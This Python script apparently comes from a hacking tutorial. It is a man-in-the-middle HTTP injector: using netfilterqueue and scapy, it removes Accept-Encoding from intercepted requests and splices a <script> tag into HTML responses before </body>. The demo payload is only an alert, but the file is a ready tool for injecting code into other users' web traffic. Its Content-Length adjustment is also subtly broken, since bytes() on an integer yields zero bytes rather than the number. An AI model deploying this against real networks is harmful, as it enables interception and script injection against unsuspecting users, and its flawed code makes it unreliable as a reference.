#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    new_packet= packet
    del new_packet[scapy.IP].len
    del new_packet[scapy.IP].chksum
    del new_packet[scapy.TCP].chksum
    new_packet[scapy.Raw].load = load

    return new_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load=scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:  # Outgoing HTTP request
            print("[+] Request")
            load= re.sub(b"Accept-Encoding:.*?\r\n", b"", load)
        elif scapy_packet[scapy.TCP].sport == 80:  # Incoming HTTP response
            print("[+] Response")
            injection_code=b"<script>alert('ya-baby');</script>"
            load = load.replace(
                b"</body>",
                injection_code +  b"</body>"
            )
            content_length_search = re.search(b"(?:Content-Length:\s)(\d*)",load)
            if content_length_search:
                content_length = int(content_length_search.group(1))
                new_content_length = content_length + int(len(injection_code))
                load=load.replace(bytes(content_length), bytes(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            print(new_packet.show())
            packet.set_payload(bytes(new_packet))  # Convert to bytes


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
